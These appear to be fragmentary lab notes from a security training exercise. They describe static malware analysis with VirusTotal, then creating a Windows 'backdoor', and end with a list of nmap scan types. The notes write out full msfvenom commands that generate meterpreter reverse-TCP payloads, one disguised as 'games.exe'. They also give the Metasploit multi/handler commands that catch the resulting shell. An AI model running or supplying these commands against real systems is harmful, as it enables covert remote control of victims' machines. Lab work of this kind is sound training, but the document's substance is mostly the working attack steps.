Perform Static Malware Analysis
Time: 20 min


Create Malware with Payload: msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.159.135  lport=4444 –platform windows -a x64 -f exe -o ab.exe


Malware created as new.exe & filesize is 73802 bytes.

Goto virustotal.com, upload exe file & analysis the malware with Virus total



Popular categories trojan, Hacktool, virus

Top 15 analysis history shown here. 

Basic properties, 


History,
Names,

PE info


Section

Click the relation tab.




Create a Backdoor to access windows OS.
Time: 20 min


Creating Malware with payload: msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.80.137  lport=4444 –platform windows -a x64 -f exe -o games.exe


Opening a server from kali
Downloading the malware from kali server. 


msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST ip
set LPORT portnumber
show options
Exploit


Successfully backdoor creation completed, 




● Insane speeds scan      on port 21/ftp 




● UDP port scan          on ports 21-100




● SYN Stealth Scan      on port 443/https 


● FIN Scan      on port 3306/mysql
 
● Xmas Scan 


● Null Scan
 
● ACK Scan

	Traceroute Geolocation Scan






